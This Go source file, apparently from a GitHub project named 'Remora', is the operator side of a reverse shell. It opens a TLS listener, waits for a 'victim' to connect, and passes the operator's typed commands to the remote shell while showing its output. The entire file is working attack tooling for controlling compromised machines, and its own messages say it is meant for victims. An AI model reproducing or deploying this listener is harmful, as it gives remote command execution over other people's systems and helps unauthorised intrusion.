package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"golang.org/x/term"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

const (
	Reset = "\033[0m"

	FgBlack   = "\033[30m"
	FgRed     = "\033[31m"
	FgGreen   = "\033[32m"
	FgYellow  = "\033[33m"
	FgBlue    = "\033[34m"
	FgMagenta = "\033[35m"
	FgCyan    = "\033[36m"
	FgWhite   = "\033[37m"
	FgDefault = "\033[39m"

	FgBrightBlack   = "\033[90m"
	FgBrightRed     = "\033[91m"
	FgBrightGreen   = "\033[92m"
	FgBrightYellow  = "\033[93m"
	FgBrightBlue    = "\033[94m"
	FgBrightMagenta = "\033[95m"
	FgBrightCyan    = "\033[96m"
	FgBrightWhite   = "\033[97m"
)

func main() {
	fmt.Print(FgCyan)
	fmt.Println("╔════════════════════════════════════╗")
	fmt.Println("║            R E M O R A             ║")
	fmt.Println("║         REVERSE SHELL IN GO        ║")
	fmt.Println("╚════════════════════════════════════╝")
	fmt.Print(Reset)
	fmt.Println("github: @imightbeakira")

	fmt.Printf("%s➜ Enter the port you want to listen: %s", FgBrightCyan, Reset)
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	port := scanner.Text()

	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Printf("%s✗ Certificate error: %v%s\n", FgBrightRed, err, Reset)
		panic(err)
	}
	ln, err := tls.Listen("tcp", ":"+port, &tls.Config{Certificates: []tls.Certificate{cert}})
	if err != nil {
		fmt.Printf("%s✗ Listen error: %v%s\n", FgBrightRed, err, Reset)
		panic(err)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println(FgRed, "\n\n[!] Shutting down...", Reset)
		ln.Close()
		os.Exit(0)
	}()

	fmt.Printf("%s✓ Listening on :%s%s\n", FgBrightGreen, port, Reset)

	fmt.Println(FgYellow, "Waiting for victim...", Reset)
	conn, err := ln.Accept()
	if err != nil {
		return
	}
	handle(conn)

	ln.Close()
}

func handle(conn net.Conn) {
	fmt.Printf("%s⚡ Victim joined from %s ⚡%s\n", FgRed, conn.RemoteAddr(), Reset)
	defer func() {
		conn.Close()
	}()
	firstOutput := make(chan struct{})
	go func() {
		r := bufio.NewReader(conn)
		first := true
		for {
			line, err := r.ReadBytes('\n')
			if len(line) > 0 {
				if first {
					first = false
					close(firstOutput)
				}
				fmt.Print(FgBrightYellow)
				os.Stdout.Write(line)
				fmt.Print(Reset)
			}
			if err != nil {
				return
			}
		}
	}()
	<-firstOutput
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Println(FgRed, "Failed to set raw mode: ", err, Reset)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	t := term.NewTerminal(os.Stdin, "")
	t.SetPrompt(FgMagenta + "↪ ")

	for {
		cmd, err := t.ReadLine()
		if err != nil {
			return
		}
		_, err = conn.Write([]byte(cmd + "\r\n"))
		if err != nil {
			return
		}
		fmt.Print(Reset)
		time.Sleep(500 * time.Millisecond)
	}
}
